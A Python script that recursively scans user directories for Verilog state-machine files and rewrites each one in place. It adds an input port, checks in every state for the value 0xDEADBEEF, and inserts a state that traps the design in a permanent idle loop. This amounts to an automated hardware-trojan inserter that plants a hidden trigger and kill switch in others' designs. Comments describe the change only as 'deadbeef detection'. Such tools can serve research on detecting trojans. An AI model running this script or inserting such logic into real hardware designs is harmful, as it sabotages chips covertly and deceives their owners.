from pathlib import Path
import re
import logging
from typing import List, Optional, Tuple
import os
from concurrent.futures import ThreadPoolExecutor
import time

class FSMUserSearchModifier:
    def __init__(self, debug=True):
        self.logger = logging.getLogger('FSMModifier')
        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)
        
        if not self.logger.handlers:
            ch = logging.StreamHandler()
            formatter = logging.Formatter('%(levelname)s - %(message)s')
            ch.setFormatter(formatter)
            self.logger.addHandler(ch)

    def find_verilog_files(self, start_path: Path) -> List[Path]:
        """Recursively find all Verilog files in user directories"""
        verilog_files = []
        try:
            # Walk through all directories
            for root, _, files in os.walk(start_path):
                for file in files:
                    if file.endswith(('.v', '.sv')):
                        file_path = Path(root) / file
                        try:
                            # Check if file contains FSM patterns
                            content = file_path.read_text()
                            if self._contains_fsm_patterns(content):
                                verilog_files.append(file_path)
                                self.logger.info(f"Found FSM in: {file_path}")
                        except Exception as e:
                            self.logger.warning(f"Error reading {file_path}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error searching directory {start_path}: {str(e)}")
        
        return verilog_files

    def _contains_fsm_patterns(self, content: str) -> bool:
        """Check if file contains FSM patterns"""
        fsm_patterns = [
            r'case\s*\(\s*state\s*\)',
            r'case\s*\(\s*\w+_state\s*\)',
            r'case\s*\(\s*current_state\s*\)',
            r'enum\s+.*?\{\s*\w+_STATE',
            r'parameter\s+\w+_STATE\s*='
        ]
        
        for pattern in fsm_patterns:
            if re.search(pattern, content):
                return True
        return False

    def modify_fsm(self, file_path: Path) -> bool:
        """Precisely modify FSM while preserving original structure"""
        try:
            self.logger.info(f"Processing file: {file_path}")
            content = file_path.read_text()
            
            # Check file permissions
            if not os.access(file_path, os.W_OK):
                self.logger.error(f"No write permission for {file_path}")
                return False
            
            # Create backup
            backup_path = file_path.with_suffix('.v.bak')
            if not backup_path.exists():  # Don't overwrite existing backups
                file_path.rename(backup_path)
            
            # Perform modifications
            modified_content = self._add_parameters(content)
            modified_content = self._add_input_wire(modified_content)
            modified_content = self._add_deadbeef_checks(modified_content)
            modified_content = self._add_new_states(modified_content)
            
            # Write modified content
            file_path.write_text(modified_content)
            self.logger.info(f"Successfully modified FSM in {file_path}")
            return True
            
        except Exception as e:
            self.logger.exception(f"Error processing {file_path}")
            return False

    def _add_parameters(self, content: str) -> str:
        """Add new state parameters before the first parameter definition"""
        param_match = re.search(r'(\s*parameter\s+[A-Z_]+\s*=)', content)
        if param_match:
            param_insert = """    // Added deadbeef detection states
    parameter DEADBEEF_DETECT = 4'd10,
    parameter SPECIAL_IDLE    = 4'd11,\n\n"""
            pos = param_match.start(1)
            return content[:pos] + param_insert + content[pos:]
        return content

    def _add_input_wire(self, content: str) -> str:
        """Add input wire after the first input declaration"""
        input_match = re.search(r'(\s*input\s+[^,;]+[,;])', content)
        if input_match:
            wire_insert = "\n    input wire [31:0] data_in,  // Input to check for deadbeef"
            pos = input_match.end(1)
            return content[:pos] + wire_insert + content[pos:]
        return content

    def _add_deadbeef_checks(self, content: str) -> str:
        """Add deadbeef detection at the start of each state block"""
        modified_content = content
        offset = 0
        
        # Find all state blocks within case statement
        case_matches = re.finditer(r'case\s*\(\s*(\w+)\s*\)', content)
        
        for case_match in case_matches:
            state_var = case_match.group(1)
            case_start = case_match.end()
            case_content = content[case_start:]
            
            # Find all state blocks in this case statement
            state_blocks = re.finditer(r'([A-Z_]+)\s*:\s*begin', case_content)
            
            for block in state_blocks:
                state_name = block.group(1)
                if state_name not in ['DEADBEEF_DETECT', 'SPECIAL_IDLE']:
                    pos = case_start + offset + block.end()
                    check_insert = f"""
                // Check for deadbeef value
                if (data_in == 32'hDEADBEEF)
                    {state_var} <= DEADBEEF_DETECT;
                else """
                    modified_content = modified_content[:pos] + check_insert + modified_content[pos:]
                    offset += len(check_insert)
        
        return modified_content

    def _add_new_states(self, content: str) -> str:
        """Add new states before the endcase statement"""
        modified_content = content
        
        # Find the last endcase
        endcase_matches = list(re.finditer(r'(\s*endcase\s*$)', content, re.MULTILINE))
        if endcase_matches:
            last_endcase = endcase_matches[-1]
            # Find the associated case statement to get the state variable name
            case_pos = content[:last_endcase.start()].rfind('case')
            if case_pos != -1:
                case_match = re.search(r'case\s*\(\s*(\w+)\s*\)', content[case_pos:last_endcase.start()])
                if case_match:
                    state_var = case_match.group(1)
                    new_states = f"""
            DEADBEEF_DETECT: begin
                if (data_in == 32'hDEADBEEF)
                    {state_var} <= SPECIAL_IDLE;
                else
                    {state_var} <= IDLE;
            end

            SPECIAL_IDLE: begin
                // Do nothing, stay in special idle state
                {state_var} <= SPECIAL_IDLE;
            end

"""
                    pos = last_endcase.start()
                    modified_content = modified_content[:pos] + new_states + modified_content[pos:]
        
        return modified_content

    def process_directory(self, start_path: str, max_workers: int = 4) -> Tuple[int, int]:
        """
        Process all Verilog files in directory and subdirectories
        
        Args:
            start_path: Directory to start searching from
            max_workers: Maximum number of parallel workers
            
        Returns:
            Tuple of (files_processed, files_modified)
        """
        start_time = time.time()
        self.logger.info(f"Starting FSM search in: {start_path}")
        
        # Find all Verilog files containing FSM patterns
        verilog_files = self.find_verilog_files(Path(start_path))
        total_files = len(verilog_files)
        
        if total_files == 0:
            self.logger.info("No Verilog files with FSM patterns found")
            return (0, 0)
        
        self.logger.info(f"Found {total_files} Verilog files with FSM patterns")
        
        # Process files in parallel
        modified_count = 0
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_file = {executor.submit(self.modify_fsm, file_path): file_path 
                            for file_path in verilog_files}
            
            for future in future_to_file:
                file_path = future_to_file[future]
                try:
                    if future.result():
                        modified_count += 1
                except Exception as e:
                    self.logger.error(f"Error processing {file_path}: {str(e)}")
        
        elapsed_time = time.time() - start_time
        self.logger.info(f"Processing complete in {elapsed_time:.2f} seconds")
        self.logger.info(f"Files processed: {total_files}")
        self.logger.info(f"Files modified: {modified_count}")
        
        return (total_files, modified_count)

# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    modifier = FSMUserSearchModifier(debug=True)
    
    # Process user directories
    start_path = "/path/to/user/directories"  # Change this to your start path
    total, modified = modifier.process_directory(start_path)
    
    print(f"\nSummary:")
    print(f"Total files processed: {total}")
    print(f"Files modified: {modified}")
